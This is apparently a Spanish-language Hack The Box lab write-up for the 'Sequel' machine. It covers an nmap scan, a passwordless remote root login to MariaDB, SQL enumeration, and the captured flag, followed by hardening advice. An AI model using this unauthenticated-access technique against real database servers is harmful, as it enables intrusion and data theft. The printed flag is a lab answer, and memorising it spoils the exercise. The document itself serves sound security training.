---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
  - mysql
  - mariadb
  - database
created: 2026-03-13
---

## 1. Información General

- **Máquina:** Sequel
- **IP:** 10.129.17.1
- **SO:** Linux
- **Dificultad:** Muy fácil
- **Fecha:** 13/03/2026

## 2. Resumen Ejecutivo

Se comprometió un servidor de bases de datos MariaDB/MySQL que presentaba una vulnerabilidad crítica de configuración por defecto: la cuenta de superusuario (`root`) no requería contraseña para conexiones remotas. Tras acceder al servicio mediante el cliente de MySQL, se enumeraron las bases de datos del sistema, identificando la base de datos `htb` y extrayendo la flag almacenada en la tabla `config`.

## 3. Enumeración (Reconocimiento)

### Escaneo de Puertos

Un escaneo dirigido a los puertos de servicios de base de datos detectó el puerto estándar de MySQL abierto:

```bash
nmap -sV -sC -p 3306 10.129.17.1
```

| Puerto | Estado | Servicio | Versión |
| :--- | :--- | :--- | :--- |
| `3306/tcp` | `open` | `mysql` | MySQL / MariaDB (sin autenticación requerida) |

## 4. Explotación (Acceso Inicial)

### Conexión sin Contraseña

Aprovechando la falta de directiva de autenticación para la cuenta `root`, se estableció conexión remota desactivando la verificación estricta de certificados:

```bash
mysql -u root -h 10.129.17.1 --ssl-verify-server-cert=FALSE
```

La sesión se inició con éxito sin solicitar credenciales.

### Extracción de Datos

Dentro del prompt interactivo de MySQL:

```sql
-- 1. Listar bases de datos disponibles
SHOW DATABASES;

-- 2. Seleccionar la base de datos objetivo
USE htb;

-- 3. Listar tablas
SHOW TABLES;

-- 4. Consultar registros de configuración
SELECT * FROM config WHERE id = 5;
```

**Resultado de la consulta:**

| id | name | value | Observación |
| :---: | :---: | :---: | :---: |
| 5 | `flag` | `7b4bec00d1a39e3dd4e021ec3d915da8` | 🚩 **Flag obtenida** |

## 5. Lecciones Aprendidas & Remediación

- **Hardening de Bases de Datos:** Ejecutar inmediatamente `mysql_secure_installation` tras el despliegue para deshabilitar logins de `root` remotos y forzar contraseñas robustas.
- **Enlace de Interfaces (Bind Address):** Configurar `bind-address = 127.0.0.1` en `my.cnf` para que el gestor de bases de datos solo acepte conexiones locales, utilizando túneles SSH para administración remota.
